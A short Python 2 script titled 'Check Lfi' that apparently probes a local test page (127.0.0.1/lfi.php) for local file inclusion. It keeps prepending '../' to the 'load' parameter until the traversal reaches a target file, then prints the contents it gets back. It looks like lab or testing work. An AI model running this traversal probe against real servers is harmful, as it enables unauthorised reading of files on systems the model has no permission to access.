# -*- coding:utf8 -*-
# ----------------------------
#      Author: Nan3r
#      Date: 2016.5.17
#      Event: Check Lfi
# ----------------------------

import requests

import re

import sys
reload(sys)
sys.setdefaultencoding('utf-8')

def gethtml(url, filepath):
	while True:
		html = requests.get(url+filepath)
		ser = re.compile('failed', re.S).search
		if ser(html.text):
			url += '../'
			print "Next Url:{0}{1}".format(url, filepath)
		else:
			print html.text
			print url+filepath
			break
		pass

if __name__ == '__main__':
	url = 'http://127.0.0.1/lfi.php?load='
	filepath = 'hack/lfi.txt'
	gethtml(url, filepath)